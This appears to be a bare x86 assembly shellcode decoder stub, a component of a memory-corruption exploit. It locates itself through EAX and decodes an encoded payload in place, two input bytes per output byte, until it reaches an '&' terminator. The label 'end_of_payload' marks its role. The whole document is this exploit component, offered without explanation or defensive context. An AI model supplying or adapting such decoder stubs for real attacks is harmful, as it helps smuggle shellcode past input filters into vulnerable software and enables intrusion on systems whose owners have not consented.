.text
.global anchor
anchor:
	pusha
	push	%eax
	pop	%ecx
	leal	0x43(%ecx),%ecx
	push	%ecx
	pop 	%edx
loop:
	cmpb	$0x26,(%ecx)
	je	end_of_payload
	xor	%al,%al
	xor	%bl,%bl
	xorb	(%ecx),%al
	inc 	%eax
	shlb	$4,%al
	inc 	%ecx
	xorb	(%ecx),%bl
	inc	%ebx
	shlb	$2,%bl
	shrb	$4,%bl
	xorb	%bl,%al
	movb	%al,(%edx)
	inc 	%edx
	xor	%al,%al
	xor	%bl,%bl
	xor	(%ecx),%al
	inc	%eax
	inc	%ecx
	xor	(%ecx),%bl
	inc	%ebx
	shlb	$6,%al
	shlb	$2,%bl
	shrb	$2,%bl
	xorb	%bl,%al
	movb	%al,(%edx)
	inc	%edx
	inc	%ecx
	jne	loop
end_of_payload:
	popa	
end:
